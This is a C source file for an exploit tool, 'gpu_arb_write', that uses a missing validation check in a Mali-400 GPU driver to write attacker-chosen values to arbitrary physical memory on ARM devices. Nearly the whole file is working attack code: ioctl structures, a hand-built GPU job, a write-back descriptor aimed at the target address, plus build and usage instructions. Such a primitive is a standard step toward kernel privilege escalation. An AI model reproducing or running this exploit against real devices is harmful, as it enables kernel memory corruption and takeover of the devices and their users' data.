/*
 * gpu_arb_write - write a 128-byte block of a repeated 8-byte value to an
 *                 arbitrary physical address, using the Mali-400 (Utgard)
 *                 write-back unit driven by a hand-crafted PP job.
 *
 * Why this works: in the Amlogic-published Utgard driver,
 * mali_mem_validation_check() is compiled with its body replaced by
 * "#else return _MALI_OSK_ERR_OK;", so MEM_BIND with the EXTERNAL_MEMORY
 * backend accepts any physical address and writes it straight into the
 * session's GPU page directory.
 *
 *   ioctl(/dev/mali, MALI_IOC_MEM_BIND, {flags = EXTERNAL_MEMORY, phys = X})
 *     -> _mali_ukk_mem_bind -> mali_mem_bind_ext_buf
 *     -> mali_mem_validation_check()  (always OK)
 *     -> mali_mmu_pagedir_update(X)
 *
 * The PP job below then makes the fragment/write-back stage emit a constant
 * 8-byte value.  With pixel_format = 0x06 the write-back unit emits exactly
 * 128 bytes: the same 8-byte value repeated 16 times, starting at the
 * requested address.  (Calibrated on hardware; see README "write primitive".)
 *
 * Build (32-bit ARM, static):
 *   arm-linux-musleabihf-gcc -O1 -static -o gpu_arb_write gpu_arb_write.c
 *
 * Usage:
 *   gpu_arb_write <phys_hex> <value_hex64>
 *
 *   The address must be page aligned; the value is written at page offset 0.
 *   A calibration self-test on a private ion page runs first and aborts if the
 *   write engine does not place exactly 16 bytes at the requested offset.
 *
 * This program does not read kernel memory and does not parse anything.
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <unistd.h>

#define ION_IOC_ALLOC 0xc0144900u
#define ION_IOC_SHARE 0xc0084904u
#define ION_IOC_CUSTOM 0xc0084906u

#define MALI_IOC_MEM_BIND 0xc0288302u
#define MALI_IOC_PP_START_JOB 0xc1988400u
#define MALI_IOC_WAIT_NOTIF 0xc0688202u

#define CMD_VA 0x20000000u
#define EXT_VA 0x40000000u
#define ION_HEAP_SYSTEM 1u
#define ION_HEAP_CARVEOUT (1u << 2)

/* Mali memory bind flag: external memory backend (phys address, not a fd). */
#define BIND_EXTERNAL (1u << 11)

#define PIXFMT_WB_128 0x06 /* 128 bytes: 8-byte value repeated 16x */

struct ion_alloc {
    uint32_t len, align, heap_mask, flags, handle;
};
struct ion_fd {
    uint32_t handle;
    int32_t fd;
};
struct ion_custom {
    uint32_t cmd, arg;
};
struct ion_phys {
    int32_t fd;
    uint32_t addr, size;
};
struct mali_bind {
    uint64_t ctx;
    uint32_t vaddr, size, flags, padding;
    uint32_t phys_addr, rights, ext_flags, pad2;
};

static void put32(void *b, unsigned off, uint32_t v)
{
    *(uint32_t *)((char *)b + off) = v;
}
static void put64(void *b, unsigned off, uint64_t v)
{
    *(uint64_t *)((char *)b + off) = v;
}

static int mali_fd = -1;
static int ion_fd = -1;
static void *cmd_buf = NULL;

/* The fragment shader is the 8 dwords written into the command buffer below.
 * The job only needs it to reach the write-back stage with a constant colour;
 * the interesting part for us is the "write target" descriptor at offset 168. */
static void build_shader(void)
{
    uint32_t *c = (uint32_t *)cmd_buf;
    memset(cmd_buf, 0, 0x4000);
    c[0] = 0;
    c[1] = 0xB8000000u;
    c[2] = 0xE0000002u | (((CMD_VA + 0x3000u) >> 3) & ~0xE0000003u);
    c[3] = 0xB0000000u;
    c[4] = 0;
    c[5] = 0xBC000000u;
    c[6] = 0;
    c[7] = 0;
}

/* Reverse the byte lane permutation the driver applies to the two constant
 * registers so that `val` lands in memory as its own little-endian bytes. */
static void encode_value(uint64_t val, uint32_t *c0, uint32_t *c1)
{
    unsigned char b[8];
    memcpy(b, &val, 8);
    *c0 = (uint32_t)b[4] | ((uint32_t)b[5] << 8) | ((uint32_t)b[2] << 16) |
          ((uint32_t)b[3] << 24);
    *c1 = (uint32_t)b[0] | ((uint32_t)b[1] << 8) | ((uint32_t)b[6] << 16) |
          ((uint32_t)b[7] << 24);
}

static int bind_region(uint32_t vaddr, uint32_t size, uint32_t flags,
                       uint32_t word0)
{
    struct mali_bind b;
    memset(&b, 0, sizeof b);
    b.vaddr = vaddr;
    b.size = size;
    b.flags = flags;
    b.phys_addr = word0;
    return ioctl(mali_fd, MALI_IOC_MEM_BIND, &b);
}

/* One write-back burst: 128 bytes of `val`, at physical `phys`. */
static int gpu_write128(uint32_t phys, uint64_t val)
{
    uint32_t c0, c1;
    encode_value(val, &c0, &c1);

    /* Map the target physical page into the GPU address space. */
    if (bind_region(EXT_VA, 0x1000, BIND_EXTERNAL, phys & ~0xfffu) < 0)
        return -1;

    static volatile uint32_t done;
    uint8_t job[408];
    memset(job, 0, sizeof job);
    done = 0;

    put64(job, 8, 0x7777);
    put32(job, 20, CMD_VA);
    put32(job, 24, CMD_VA + 0x1000);
    put32(job, 32, 0x02);
    put32(job, 44, c0);
    put32(job, 48, c1);
    put32(job, 52, c0);
    put32(job, 56, c1);
    put32(job, 68, CMD_VA + 0x2000);
    put32(job, 72, (0x400u << 16) | 0x400u);
    put32(job, 84, 1);
    put32(job, 88, 1);
    put32(job, 92, 0x77);
    put32(job, 96, 1);
    put32(job, 104, 0xE0C);
    put32(job, 108, 0x8888);
    /* --- write target descriptor --- */
    put32(job, 168, 0x02);                        /* kind: write-back */
    put32(job, 172, EXT_VA + (phys & 0xfffu));    /* destination address */
    put32(job, 176, PIXFMT_WB_128);               /* pixel format */
    put32(job, 188, 0);
    put32(job, 200, 0);
    put32(job, 328, 1);
    put32(job, 352, 0);
    put32(job, 396, (uint32_t)-1);
    put64(job, 400, (uint64_t)(uintptr_t)&done);

    if (ioctl(mali_fd, MALI_IOC_PP_START_JOB, job) < 0)
        return -1;

    uint8_t notif[104];
    memset(notif, 0, sizeof notif);
    alarm(5);
    int r = ioctl(mali_fd, MALI_IOC_WAIT_NOTIF, notif);
    alarm(0);
    if (r < 0)
        return -1;

    /* Let the write drain before the caller inspects the target. */
    size_t n = 8u << 20;
    volatile char *p = malloc(n);
    if (p) {
        for (size_t i = 0; i < n; i += 64) p[i] = (char)(i * 7);
        free((void *)p);
    }
    usleep(40000);
    return 0;
}

/* Self-test: prove on a private, CPU-mappable page that a request for address
 * X produces exactly 16 changed bytes starting at X (no shift, no overflow). */
static int calibrate(void)
{
    struct ion_alloc a;
    memset(&a, 0, sizeof a);
    a.len = 0x1000;
    a.align = 0x1000;
    a.heap_mask = ION_HEAP_CARVEOUT;
    if (ioctl(ion_fd, ION_IOC_ALLOC, &a) < 0) {
        perror("ion carveout alloc");
        return -1;
    }
    struct ion_fd f;
    f.handle = a.handle;
    f.fd = -1;
    if (ioctl(ion_fd, ION_IOC_SHARE, &f) < 0) {
        perror("ion share");
        return -1;
    }
    uint8_t *pg = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, f.fd, 0);
    if (pg == MAP_FAILED) {
        perror("mmap carveout");
        return -1;
    }
    struct ion_phys ip;
    memset(&ip, 0, sizeof ip);
    ip.fd = f.fd;
    struct ion_custom cu;
    cu.cmd = 8; /* ION_IOC_CUSTOM/custom cmd 8 == ion_phys */
    cu.arg = (uint32_t)(uintptr_t)&ip;
    if (ioctl(ion_fd, ION_IOC_CUSTOM, &cu) < 0) {
        perror("ion phys");
        return -1;
    }

    const uint32_t off = 0x800;
    const uint64_t val = 0xa1b2c3d4e5f60718ULL;
    memset(pg, 0xa5, 0x1000);
    if (gpu_write128(ip.addr + off, val) < 0) {
        printf("[!] calibration write failed\n");
        return -1;
    }

    int first = -1, last = -1, changed = 0;
    for (uint32_t i = 0; i < 0x1000; i++) {
        if (pg[i] != 0xa5) {
            if (first < 0) first = (int)i;
            last = (int)i;
            changed++;
        }
    }
    int ok = (first == (int)off) && (changed == 128);
    for (int i = 0; i < 16 && ok; i++)
        if (pg[off + i] != ((uint8_t *)&val)[i & 7]) ok = 0;

    printf("[*] calibration: request 0x%03x -> changed [0x%03x..0x%03x], %d bytes  %s\n",
           off, first, last, changed, ok ? "OK" : "FAILED");
    munmap(pg, 0x1000);
    return ok ? 0 : -1;
}

int main(int argc, char **argv)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    if (argc < 3) {
        fprintf(stderr, "usage: %s <phys_hex> <value_hex64>\n", argv[0]);
        return 1;
    }
    uint32_t phys = (uint32_t)strtoul(argv[1], NULL, 16);
    uint64_t val = strtoull(argv[2], NULL, 16);

    mali_fd = open("/dev/mali", O_RDWR);
    ion_fd = open("/dev/ion", O_RDWR);
    if (mali_fd < 0 || ion_fd < 0) {
        perror("open /dev/mali or /dev/ion");
        return 1;
    }

    /* Command buffer: ion system heap, mapped into the GPU at CMD_VA. */
    struct ion_alloc a;
    memset(&a, 0, sizeof a);
    a.len = 0x4000;
    a.align = 0x1000;
    a.heap_mask = ION_HEAP_SYSTEM;
    if (ioctl(ion_fd, ION_IOC_ALLOC, &a) < 0) {
        perror("ion cmd alloc");
        return 1;
    }
    struct ion_fd f;
    f.handle = a.handle;
    f.fd = -1;
    if (ioctl(ion_fd, ION_IOC_SHARE, &f) < 0) {
        perror("ion cmd share");
        return 1;
    }
    cmd_buf = mmap(NULL, 0x4000, PROT_READ | PROT_WRITE, MAP_SHARED, f.fd, 0);
    if (cmd_buf == MAP_FAILED) {
        perror("mmap cmd");
        return 1;
    }
    if (bind_region(CMD_VA, 0x4000, 0 /* DMA_BUF */, (uint32_t)f.fd) < 0) {
        perror("bind cmd buffer");
        return 1;
    }
    build_shader();

    if (calibrate() < 0) {
        printf("[!] aborting without touching the requested address\n");
        return 2;
    }
    if (phys & 0xfff) {
        fprintf(stderr, "[!] physical address must be page aligned\n");
        return 1;
    }

    printf("[*] writing 128 bytes of 0x%016llx at phys 0x%08x\n",
           (unsigned long long)val, phys);
    if (gpu_write128(phys, val) < 0) {
        perror("gpu write");
        return 1;
    }
    printf("[*] done\n");
    return 0;
}
